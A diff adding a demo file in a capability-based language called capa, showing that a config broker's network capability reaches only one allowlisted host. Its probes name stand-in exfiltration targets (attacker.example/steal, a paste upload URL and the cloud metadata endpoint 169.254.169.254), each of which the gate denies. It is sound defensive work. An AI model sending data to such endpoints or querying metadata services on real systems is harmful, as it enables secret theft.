@@ -1,0 +1,60 @@
+// deny_offhost.capa
+//
+// SECOND DEMONSTRATION: network attenuation, shown at runtime.
+//
+// Where leaky_configbroker.capa proves the information-flow guarantee
+// (secrets cannot reach a public sink) as a COMPILE-TIME error, this file
+// proves the NETWORK-ATTENUATION guarantee (the broker can reach only the
+// one allowlisted upstream host) as a RUNTIME fact you can watch happen.
+//
+// The Net capability is restricted to the single upstream host. When the
+// broker then tries to reach ANY other host, the capability's gate denies
+// the request BEFORE any system call: no DNS lookup, no socket, no
+// packet. The denied attempt returns a typed Err with the current
+// restriction set, and NOTHING leaves the machine.
+//
+// This is the machine-checkable half of "provably cannot exfiltrate to a
+// second host". The other half is the SBOM: capa --manifest records the
+// restrict_to("config.internal.example"), so an auditor sees the single
+// allowlisted host without running anything.
+//
+// Run it (deterministic, offline, exit 0):
+//     python -m capa --run deny_offhost.capa
+//     python -m capa --wasm --run deny_offhost.capa   (identical)
+//
+// This demo passes the probe URLs THROUGH a helper parameter so it can
+// loop over several hosts, which makes the URL dynamic. Dynamic Net URLs
+// are rejected under --wasi (the static host ceiling needs a literal),
+// so run this file on the Python or Wasm backend. The main resolver
+// (configbroker.capa) uses LITERAL fetch URLs and runs on --wasi fine.
+//
+// It prints one ALLOWED probe (the sanctioned host passes the gate; the
+// actual fetch then fails only because there is no live upstream in the
+// demo) and three DENIED probes (every other host is refused at the gate,
+// with no network touched at all).
+
+fun probe(stdio: Stdio, net: Net, label: String, url: String)
+    match net.get(url)
+        Ok(_)  -> stdio.println("${label}: reached (gate allowed, upstream answered)")
+        Err(e) -> stdio.println("${label}: ${e}")
+
+pub fun main(stdio: Stdio, net: Net)
+    stdio.println("== capa_configbroker: network attenuation demo ==")
+
+    // Attenuate to the single allowlisted upstream host. Literal host so
+    // the WASI static host ceiling resolves it too.
+    let upstream = net.restrict_to("config.internal.example")
+
+    // ALLOWED host: passes the gate. The fetch itself then fails only
+    // because the demo has no live upstream; the point is the gate let it
+    // THROUGH, so this is the one host the broker may talk to.
+    probe(stdio, upstream, "allowlisted config.internal.example", "http://config.internal.example/secrets/DB_PASSWORD")
+
+    // DENIED hosts: the gate refuses each BEFORE any system call. These
+    // are the exfiltration targets an attacker would want; the attenuated
+    // capability makes them unreachable regardless of what the URL says.
+    probe(stdio, upstream, "attacker exfil host", "http://attacker.example/steal")
+    probe(stdio, upstream, "public paste service", "http://paste.example/upload")
+    probe(stdio, upstream, "cloud metadata endpoint", "http://169.254.169.254/latest/meta-data/")
+
+    stdio.println("only the allowlisted host passed the gate; every other host was denied with no network touched (Net attenuation)")
